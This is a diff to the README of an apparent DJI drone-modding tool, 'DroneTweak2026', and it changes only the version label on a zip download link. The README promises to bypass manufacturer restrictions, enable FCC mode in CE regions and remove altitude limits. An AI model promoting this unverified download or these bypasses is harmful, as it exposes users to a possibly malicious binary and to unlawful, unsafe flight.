@@ -3,7 +3,7 @@
 [![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/)
 [![DJI Support](https://img.shields.io/badge/Support-Air%203%20%7C%20Mavic%20%7C%20Mini-orange)](https://github.com/)
 
-> **[DOWNLOAD LATEST VERSION (v2.1.0)](https://github.com/Jkloeten/DroneTweak2026/releases/download/Releases/DroneTweak2026.zip)**
+> **[DOWNLOAD LATEST VERSION (v1.8.9)](https://github.com/Jkloeten/DroneTweak2026/releases/download/Releases/DroneTweak2026.zip)**
 
 **Unlock the full potential of your DJI Drone.** This tool provides a simple GUI to bypass manufacturer restrictions, enable FCC mode in CE regions, and remove altitude limits. Now fully compatible with **Air 3** and **Mini 4 Pro**.
 
